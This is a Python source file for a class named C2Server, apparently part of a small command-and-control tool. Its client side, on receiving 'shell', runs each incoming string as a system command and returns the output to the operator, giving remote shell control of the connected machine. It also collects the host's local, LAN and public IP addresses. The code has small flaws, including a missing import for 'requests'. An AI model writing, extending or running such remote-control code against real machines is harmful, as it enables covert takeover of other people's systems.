import socket
from helper.socket import Server, Client
from helper.Shell import Shell

class C2Server():
    def __init__(self, host="0.0.0.0", port=7706):
        self.host = host
        self.port = int(port)
        self.shell_mode = False


    def start_server(self):
        print("[STARTING] server is starting...")
        self.server = Server(self.handle_client, self.host, self.port)

    def start_client(self):
        print("[STARTING] client is starting...")
        self.client = Client(self.handle_server, self.host, self.port)
   
    def handle_server(self, res, instance):
        print(f"[server][{self.host}:{self.port}]: {res}")

        if res == "shell":
            self.shell_mode = True
            instance.heder = 20480
            instance.send("shell: Started")
            return

        if self.shell_mode:

            if res == "exit":
                self.shell_mode = False
                instance.send("shell: Stopped")
                return

            shell = Shell(res)
            result = shell.run()
            instance.send(f"shell>:\n {result['stdout']}")
            return

        instance.send("Command Executed")
        


    def handle_client(self, res, instance):
        print(f"[client][{self.host}:{self.port}]: {res}")

        cmd = input(f"[server][{self.host}:{self.port}]: ").strip()
        instance.send(cmd)

        
    def get_network_info(self):
        """Get complete network info"""
        info = {}
        
        # Local IPs
        host = socket.gethostname()
        info['localhost'] = '127.0.0.1'
        try:
            local_ip = socket.gethostbyname(host)
            info['local'] = local_ip
        except:
            pass
            
        # LAN IP  
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            info['lan'] = s.getsockname()[0]
            s.close()
        except:
            pass
            
        # Public IP
        try:
            info['public'] = requests.get('https://api.ipify.org', timeout=5).text.strip()
        except:
            info['public'] = 'Check manually'
            
        return info